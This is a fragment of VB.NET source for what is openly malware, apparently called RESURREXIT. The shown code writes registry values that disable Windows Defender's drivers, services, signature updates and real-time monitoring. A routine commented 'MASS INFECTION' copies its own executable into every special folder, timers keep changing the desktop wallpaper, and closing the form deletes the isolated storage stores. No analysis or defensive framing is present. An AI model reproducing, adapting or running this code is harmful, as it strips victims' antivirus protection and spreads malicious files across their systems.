            Registry.SetValue("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdBoot",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdFilter",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdFilter",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdFilter",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdNisDrv",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdNisDrv",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdNisDrv",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet001\Services\WdNisSvc",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\ControlSet002\Services\WdNisSvc",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WdNisSvc",
                              "Start", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates",
                              "ForceUpdateFromMU", 0, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates",
                              "ForceUpdateFromMU", 0, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates",
                              "UpdateOnStartUp", 0, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates",
                              "UpdateOnStartUp", 0, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                              "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
                              "DisableRealtimeMonitoring", 1, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services",
                              "SecurityHealthService", 4, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services",
                              "SecurityHealthService", 4, RegistryValueKind.DWord)

            ' using services to disable windows defender //
            Registry.SetValue("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services",
                              "WdNisSvc", 3, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services",
                              "WdNisSvc", 3, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_CURRENT_USER\SYSTEM\CurrentControlSet\Services",
                              "WinDefend", 3, RegistryValueKind.DWord)

            Registry.SetValue("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services",
                              "WinDefend", 3, RegistryValueKind.DWord)

        Catch __unusedException1__ As Exception
        End Try

    End Sub

    Public Function GetRegistry(_key As String,
                                name As String,
                                globalNode As Boolean) As String
        Try

            If globalNode Then

                Dim subKey As RegistryKey =
                    Registry.LocalMachine.OpenSubKey(_key,
                                                     False)
                If subKey IsNot Nothing Then

                    Dim result As String =
                        subKey.GetValue(name).ToString()

                    Return result

                End If

            Else

                Dim subKey2 As RegistryKey =
                    Registry.CurrentUser.OpenSubKey(_key,
                                                    False)
                If subKey2 IsNot Nothing Then

                    Dim result As String = subKey2.GetValue(name).ToString()

                    Return result

                End If

            End If

        Catch

            Dim result As String = ""

            Return result

        End Try

        Return ""

    End Function
    Public Function GetInstallName() As String
        On Error Resume Next
        Return GetRegistry("Software\Microsoft\Windows", "A",
                           GetAdminStatus())

    End Function

    Public Function GetAdminStatus() As Boolean

        Dim result As Boolean

        Try

            result =
                New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) 'True
        Catch

            result =
                False
        End Try

        Return result

    End Function

    'MASS INFECTION TO ALL SPECIAL FOLDERS
    Public Sub OutputPathsTest() 'Self Existence | Replication of Assembly's .EXE to every given directory
        On Error Resume Next

        Dim values =
            GetValues(Of Environment.SpecialFolder)()

        For Each e In values
            'Represents a multitude of directories
            Dim path As String = Environment.GetFolderPath(e)

            Dim FileToCopy As String = Assembly.GetExecutingAssembly().Location

            If File.Exists(FileToCopy) = True Then


                Dim NewCopy As String =
                    path & "\RESURREXIT.exe"

                File.Copy(FileToCopy, NewCopy)

            End If

            Debug.WriteLine("| " & e.ToString() & " | " & path & " |") 'If placed as a messagebox, it will iterate through directories, listing off each one.
        Next
    End Sub

    Private Shared Function GetValues(Of T)() As IEnumerable(Of T)

        Return [Enum].GetValues(GetType(T)).Cast(Of T)()
    End Function

    'HALL OF TIME | CONTINUOUS WALLPAPER CHANGE
    Private Sub Timer2_Tick(sender As Object,
                            e As EventArgs) Handles Timer2.Tick
        Timer2.Stop()

        Timer3.Start()

        Dim returncode As Integer

        returncode =
            SystemParametersInfo(20,
                                 0,
                                 imagepath,
                                 0)
        Key =
            Registry.CurrentUser.OpenSubKey("Control Panel",
                                              True)
        Try
            Key =
                Key.OpenSubKey("Desktop",
                               True)

            Key.SetValue("Wallpaper",
                         imagepath)
        Catch

            Debug.WriteLine("Error")

        End Try
    End Sub

    Private Sub Timer3_Tick(sender As Object,
                            e As EventArgs) Handles Timer3.Tick
        Timer3.Stop()

        Timer4.Start()

        Dim returncode As Integer

        returncode =
            SystemParametersInfo(20,
                                 0,
                                 imagepath2,
                                 0)
        Key =
            Registry.CurrentUser.OpenSubKey("Control Panel",
                                              True)
        Try
            Key =
                Key.OpenSubKey("Desktop",
                                 True)
            Key.SetValue("Wallpaper",
                         imagepath2)
        Catch
            Debug.WriteLine("error")
        End Try
    End Sub

    Private Sub Timer4_Tick(sender As Object,
                            e As EventArgs) Handles Timer4.Tick
        Timer4.Stop()

        Timer5.Start()

        Dim returncode As Integer

        returncode =
            SystemParametersInfo(20, 0, imagepath3, 0)

        Key =
            Registry.CurrentUser.OpenSubKey("Control Panel",
                                            True)
        Try

            Key =
                Key.OpenSubKey("Desktop",
                                 True)

            Key.SetValue("Wallpaper",
                         imagepath3)

        Catch

            Debug.WriteLine("Error")

        End Try

    End Sub

    Private Sub Timer5_Tick(sender As Object,
                            e As EventArgs) Handles Timer5.Tick

        Timer5.Stop()

        Timer6.Start()

        Dim returncode As Integer

        returncode =
            SystemParametersInfo(20,
                                          0,
                                          imagepath4,
                                          0)
        Key =
            Registry.CurrentUser.OpenSubKey("Control Panel",
                                              True)
        Try
            Key =
                Key.OpenSubKey("Desktop",
                                 True)
            Key.SetValue("Wallpaper",
                         imagepath4)
        Catch

            Debug.WriteLine("error")

        End Try

    End Sub

    Private Sub Timer6_Tick(sender As Object,
                            e As EventArgs) Handles Timer6.Tick
        Timer2.Start()

        Timer6.Stop()

        Dim returncode As Integer

        returncode = SystemParametersInfo(20,
                                          0,
                                          imagepath5,
                                          0)

        Key =
            Registry.CurrentUser.OpenSubKey("Control Panel",
                                              True)
        Try

            Key =
                Key.OpenSubKey("Desktop",
                                 True)

            Key.SetValue("Wallpaper",
                         imagepath5)
        Catch

            Debug.WriteLine("Error")

        End Try

    End Sub


    Private Sub Form1_FormClosing(sender As Object,
                                  e As FormClosingEventArgs) Handles MyBase.FormClosing

        ' The Remove method deletes a specific store, in this case the
        ' isoStore1 file.
        Dim isoStore1 As IsolatedStorageFile =
            IsolatedStorageFile.GetStore(IsolatedStorageScope.User Or IsolatedStorageScope.Domain Or IsolatedStorageScope.Assembly, Nothing, Nothing)
        isoStore1.Remove()
        Debug.WriteLine("The user, domain, and assembly isolated store has been deleted.")

        ' This static method (C# uses\not VB) deletes all the isolated stores for this user, however I converted the code.

        IsolatedStorageFile.Remove(IsolatedStorageScope.User)
        Debug.WriteLine("All isolated stores for this user have been deleted.")


        'SelfDestruct()
    End Sub
    '>>>>END

End Class
